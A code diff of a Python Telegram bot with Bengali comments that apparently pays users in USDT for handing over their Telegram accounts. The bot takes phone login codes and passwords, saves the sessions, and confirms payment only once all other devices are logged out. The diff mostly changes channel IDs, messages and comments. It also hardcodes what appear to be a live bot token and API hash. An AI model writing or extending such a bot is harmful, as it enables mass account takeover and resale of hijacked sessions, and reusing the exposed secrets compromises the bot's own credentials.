@@ -18,13 +18,13 @@ API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
 BOT_TOKEN = "8288574083:AAFuTtmz2pqZavP7x8jlhnWJ0Gdad8r2olk"
 ADMIN_ID = 8095751648
 
-# 📢 এখানে আপনার চ্যানেলগুলোর আইডি বসাবেন (যেমন: -100XXXXXXXXXX)
-MAIN_CHANNEL_ID = -1003904729385      # মেইন চ্যানেল (যেখানে জয়েন না করলে বট কাজ করবে না)
-SESSION_LOG_CHANNEL_ID = -1004345512666 # নতুন ভেরিফাইড সেশন জমার চ্যানেল
-WITHDRAW_LOG_CHANNEL_ID = -1004331985961 # উইথড্র রিকোয়েস্ট আসার চ্যানেল
+# 📢 আপনার দেওয়া চ্যানেল আইডিগুলো একবারে পারফেক্ট ফরম্যাটে বসিয়ে দেওয়া হলো
+MAIN_CHANNEL_ID = -1003904729385         # মেইন চ্যানেল (বাধ্যতামূলক জয়েন)
+SESSION_LOG_CHANNEL_ID = -1004345512666   # সেশন কনফার্মেশন চ্যানেল 
+WITHDRAW_LOG_CHANNEL_ID = -1004331985961  # উইথড্র কনফার্মেশন চ্যানেল
 
-# প্রজেক্টের লিংক (ইউজারকে জয়েন লিংকে দেখানোর জন্য)
-MAIN_CHANNEL_LINK = "https://t.me/your_main_channel_username" 
+# মেইন চ্যানেলের ইউজারনেম লিংক (এখানে আপনার আসল ইউজারনেমটি দিয়ে দিতে পারেন)
+MAIN_CHANNEL_LINK = "https://t.me/A_ToolsX" 
 # =================================================================
 
 BASE_STORAGE_DIR = "user_backups"
@@ -129,12 +129,11 @@ def reject_pending_account(user_id, amount):
         save_db(db)
 
 def clear_user_verified_balance_and_stats(user_id):
-    """উইথড্র করার পর ইউজারের ভেরিফাইড ব্যালেন্স এবং ভেরিফাইড সংখ্যা ০ করার ২য় রিকোয়েস্টের ফিক্স"""
     db = load_db()
     uid = str(user_id)
     if uid in db:
         db[uid]["verified_balance"] = 0.0
-        db[uid]["verified"] = 0  # উইথড্র করার পর প্রোফাইলে ভেরিফাইড একাউন্ট ডাটা ০ হয়ে যাবে
+        db[uid]["verified"] = 0  
         if "balance" in db[uid]: db[uid]["balance"] = 0.0
         save_db(db)
 
@@ -184,7 +183,6 @@ def start_async_loop(loop):
 Thread(target=start_async_loop, args=(bot_loop,), daemon=True).start()
 
 def is_user_joined_main_channel(user_id):
-    """৩য় ফিক্স: মেইন চ্যানেলে জয়েন আছে কিনা চেক করা"""
     if user_id == ADMIN_ID: return True
     try:
         member = bot.get_chat_member(MAIN_CHANNEL_ID, user_id)
@@ -192,16 +190,16 @@ def is_user_joined_main_channel(user_id):
             return True
         return False
     except:
-        return True # চ্যানেল আইডি ভুল থাকলে বা বট অ্যাড না থাকলে যেন আটকে না যায়
+        return True 
 
 def check_force_join(message):
-    """ইউজার চ্যানেলে জয়েন না থাকলে তাকে আটকে মেসেজ দেওয়া"""
+    """আপনার রিকোয়েস্ট অনুযায়ী কাস্টমাইজড মেসেজ সেট করা হলো"""
     if not is_user_joined_main_channel(message.from_user.id):
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("📢 Join Our Channel", url=MAIN_CHANNEL_LINK))
         bot.send_message(
             message.chat.id, 
-            "⚠️ **You must join our main channel to use this bot!**\n\nদয়া করে নিচের চ্যানেলে জয়েন করে আবার ট্রাই করুন। জয়েন না করলে বটের কোনো কমান্ড কাজ করবে না।", 
+            "⚠️ **Please join our main channel for more update!**\n\nবট ব্যবহার করতে আপনাকে অবশ্যই আমাদের মেইন চ্যানেলে জয়েন করতে হবে। জয়েন করার পর আবার ট্রাই করুন।", 
             reply_markup=markup
         )
         return False
@@ -348,7 +346,6 @@ def admin_panel_command(message):
     markup.add(types.InlineKeyboardButton("📂 All Session Files", callback_data="pnl_all_files"), types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close"))
     
     trash_cnt = get_trash_file_count()
-    # ১ নম্বর ফিক্স: Trash এর দুটি অপশন বাটন (লিস্ট দেখা এবং ডিলিট করা)
     markup.add(types.InlineKeyboardButton(f"🗑️ View Trash Files ({trash_cnt} Pcs)", callback_data="pnl_view_trash"))
     markup.add(types.InlineKeyboardButton("💥 Delete All Trash Permanent", callback_data="pnl_clear_trash"))
     
@@ -371,7 +368,6 @@ def handle_admin_callbacks(call):
         admin_state[call.from_user.id] = "wait_country_all"
     
     elif call.data == "pnl_view_trash":
-        # ১ নম্বর ফিক্সের ১ম পার্ট: ট্র্যাশে কি কি ফাইল এক্সপোর্ট করা আছে তার তালিকা বের করা
         if not os.path.exists(TRASH_STORAGE_DIR):
             bot.answer_callback_query(call.id, "Trash directory does not exist!", show_alert=True)
             return
@@ -380,14 +376,13 @@ def handle_admin_callbacks(call):
             bot.answer_callback_query(call.id, "🗑️ Trash Bin is totally empty!", show_alert=True)
             return
         list_msg = "🗑️ **Exposed/Exported Files List in Bin:**\n\n"
-        for idx, f in enumerate(trash_files[:50], 1): # সর্বোচ্চ ৫০ টা ফাইল একসাথে দেখাবে
+        for idx, f in enumerate(trash_files[:50], 1):
             list_msg += f"{idx}. `{f}`\n"
         if len(trash_files) > 50: list_msg += f"\nAnd {len(trash_files)-50} more files..."
         bot.send_message(call.message.chat.id, list_msg)
         bot.answer_callback_query(call.id)
         
     elif call.data == "pnl_clear_trash":
-        # ১ নম্বর ফিক্সের ২য় পার্ট: পার্মানেন্টলি ট্র্যাশ ক্লিয়ার করা
         try:
             for file in os.listdir(TRASH_STORAGE_DIR):
                 os.remove(os.path.join(TRASH_STORAGE_DIR, file))
@@ -432,11 +427,11 @@ def handle_text(message):
                 bot.reply_to(message, "❌ **Withdraw failed! Your verified balance is 0.00.**")
                 del admin_state[user_id]
                 return
-            clear_user_verified_balance_and_stats(user_id) # ২য় ফিক্স অনুযায়ী একাউন্ট রিসেট
+            clear_user_verified_balance_and_stats(user_id)
             del admin_state[user_id]
             bot.reply_to(message, f"✅ **Your Card withdrawal request for {current_bal} USDT has been submitted!**")
             
-            # 💵 ২য় ফিক্স: এডমিন বটে না পাঠিয়ে নির্ধারিত উইথড্র চ্যানেলে পাঠানো হচ্ছে
+            # 💳 উইথড্র কনফার্মেশন শুধু Withdraw চ্যানেলে যাবে
             try: bot.send_message(WITHDRAW_LOG_CHANNEL_ID, f"📥 **Withdraw Card!**\n👤 User: `{user_id}`\n💰 Amount: {current_bal} USDT\n💳 Info: {text}")
             except: bot.send_message(ADMIN_ID, f"⚠️ Channel Fail! Card Withdraw Log: User `{user_id}` | Amt: {current_bal} | Info: {text}")
             return
@@ -452,11 +447,11 @@ def handle_text(message):
                 bot.reply_to(message, "❌ **Withdraw failed! Your verified balance is 0.00.**")
                 del admin_state[user_id]
                 return
-            clear_user_verified_balance_and_stats(user_id) # ২য় ফিক্স অনুযায়ী একাউন্ট রিসেট
+            clear_user_verified_balance_and_stats(user_id)
             del admin_state[user_id]
             bot.reply_to(message, f"✅ **Your USDT (BEP-20) withdrawal request for {current_bal} USDT has been submitted!**")
             
-            # 🪙 ২য় ফিক্স: এডমিন বটে না পাঠিয়ে নির্ধারিত উইথড্র চ্যানেলে পাঠানো হচ্ছে
+            # 🪙 উইথড্র কনফার্মেশন শুধু Withdraw চ্যানেলে যাবে
             try: bot.send_message(WITHDRAW_LOG_CHANNEL_ID, f"📥 **Withdraw BEP20!**\n👤 User: `{user_id}`\n💰 Amount: {current_bal} USDT\n🪙 Addr: `{text}`")
             except: bot.send_message(ADMIN_ID, f"⚠️ Channel Fail! BEP20 Withdraw Log: User `{user_id}` | Amt: {current_bal} | Addr: {text}")
             return
@@ -496,7 +491,6 @@ def handle_text(message):
             except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
             return
 
-    # সাধারণ ইউজার মেসেজ পাঠানোর সময়ও ফোর্স জয়েন চেক করা
     if not check_force_join(message): return
 
     if user_id in user_data and ("phone_code_hash" in user_data[user_id] or user_data[user_id].get("waiting_for_password")):
@@ -584,7 +578,7 @@ async def process_backup(user_id, message, data):
     price = settings["country_prices"].get(data['country_code'], 0.24)
     
     add_to_verified_numbers(data["clean_phone"])
-    add_user_pending_account(user_id, price) # ১ ঘণ্টা বা নির্ধারিত ডিলে পর্যন্ত এটি আনভেরিফাইড ও পেন্ডিং দেখাবে
+    add_user_pending_account(user_id, price)
     
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton(f"✅ Account Verification {price}", callback_data="none"))
@@ -611,10 +605,10 @@ async def process_backup(user_id, message, data):
             
             if len(other_devices) == 0:
                 await data["client"].disconnect()
-                convert_pending_to_verified(user_id, price) # সাকসেসফুল হলে আনভেরিফাইড কেটে ভেরিফাইটে যাবে
+                convert_pending_to_verified(user_id, price)
                 bot.send_message(message.chat.id, f"🎉 **Account {data['phone']} confirmed!** Balance moved to Verified.")
                 
-                # 🔔 ২য় ফিক্স: এডমিন আইডিতে না পাঠিয়ে সরাসরি "সেশন চ্যানেল"-এ অ্যালার্ট পাঠানো হচ্ছে
+                # 🔔 সেশন সাকসেসফুল কনফার্মেশনের মেসেজটি শুধু সেশন চ্যানেলে যাবে
                 try: bot.send_message(SESSION_LOG_CHANNEL_ID, f"🔔 **New Verified Session Saved:** `{data['phone']}`")
                 except: bot.send_message(ADMIN_ID, f"⚠️ Channel Fail! New Session: `{data['phone']}`")
                 return
